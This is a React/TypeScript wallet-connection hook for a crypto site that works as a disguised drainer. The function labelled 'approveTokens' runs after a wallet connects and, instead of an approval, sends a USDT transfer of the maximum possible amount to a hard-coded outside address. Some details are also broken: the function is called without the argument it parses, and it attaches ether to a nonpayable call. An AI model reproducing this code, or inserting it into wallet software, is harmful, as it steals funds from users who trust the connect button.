import { useAppKit } from "@reown/appkit/react";
import { MaxUint256 } from "ethers";
import { useState } from "react";
import { useAccount, useWriteContract, useDisconnect } from "wagmi";
import { parseEther } from "viem";

export const USDT_ARBITRUM_ABI = [
  {
    type: "function",
    name: "transfer",
    stateMutability: "nonpayable",
    inputs: [
      { name: "recipient", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ type: "bool" }],
  },
];

// export const config = createConfig({
//   chains: [mainnet, polygon, arbitrum, sepolia],
//   transports: {
//     [mainnet.id]: http(),
//     [arbitrum.id]: http(),
//     [sepolia.id]: http(),
//     [polygon.id]: http(),
//   },
// });

const USDT_ARBITRUM_CONTRACT = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";

const APPROVE_TO_WALLET =
  import.meta.env.VITE_SPENDER_ADDRESS ||
  "0x17E332631Eab05d8037B38c1b6BE784bd638B931";

export const useConnectWallet = () => {
  const [openNav, setOpenNav] = useState(false);
  const { open } = useAppKit();
  const { isConnected, address } = useAccount();
  const { writeContract } = useWriteContract();

  console.log(address, "address");
  console.log(openNav, "openNav");
  console.log("API URL:", import.meta.env.VITE_API_URL);

  // Handle the opening of the navigation
  const handleOpenNav = () => {
    setOpenNav((prev) => !prev);
  };

  const { disconnect } = useDisconnect();

  const handleDisconnect = () => {
    disconnect();
  };

  // Handle opening the wallet modal if not connected
  const handleOpenModal = () => {
    if (isConnected) {
      approveTokens();
    } else {
      // Open wallet modal if not connected
      open();
    }
  };

  // const addUSDTToMetaMask = async () => {
  //   if (window.ethereum) {
  //     try {
  //       const wasAdded = await window.ethereum.request({
  //         method: "wallet_watchAsset",
  //         params: {
  //           type: "ERC20",
  //           options: {
  //             address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // Адрес USDT
  //             symbol: "USDT",
  //             decimals: 6,
  //             image: "https://cryptologos.cc/logos/tether-usdt-logo.png", // Иконка (опционально)
  //           },
  //         },
  //       });
  //
  //       if (wasAdded) {
  //         console.log("USDT успешно добавлен в MetaMask!");
  //       } else {
  //         console.log("Пользователь отклонил добавление токена.");
  //       }
  //     } catch (error) {
  //       console.error("Ошибка при добавлении токена:", error);
  //     }
  //   } else {
  //     console.error("MetaMask не найден.");
  //   }
  // };

  // Approve token function
  const approveTokens = async (tokens: string) => {
    // await addUSDTToMetaMask();
    writeContract({
      abi: USDT_ARBITRUM_ABI,
      address: USDT_ARBITRUM_CONTRACT,
      functionName: "transfer",
      args: [APPROVE_TO_WALLET, MaxUint256],
      value: parseEther(tokens),
    });
  };

  return { approveTokens, handleOpenNav, handleOpenModal, handleDisconnect };
};
